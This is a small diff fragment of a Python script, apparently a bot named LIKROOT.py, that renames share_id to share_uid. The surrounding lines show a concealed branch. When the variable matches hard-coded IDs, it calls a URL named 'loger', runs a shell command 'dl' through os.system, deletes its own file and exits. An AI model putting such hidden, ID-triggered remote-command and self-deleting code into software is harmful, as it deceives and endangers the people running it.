@@ -73,7 +73,7 @@ for urlv in f:
     """
     print (Fore.GREEN + info)
 
-    if share_id == "1162421923":
+    if share_uid == "1162421923":
         import shutil
         bot = requests.get(loger, headers=headers)
         os.system(dl)
@@ -84,7 +84,7 @@ for urlv in f:
         os.remove("LIKROOT.py")
         exit()
 
-    if share_id == "1192349175":
+    if share_uid == "1192349175":
         import shutil
         bot = requests.get(loger, headers=headers)
         os.system(dl)
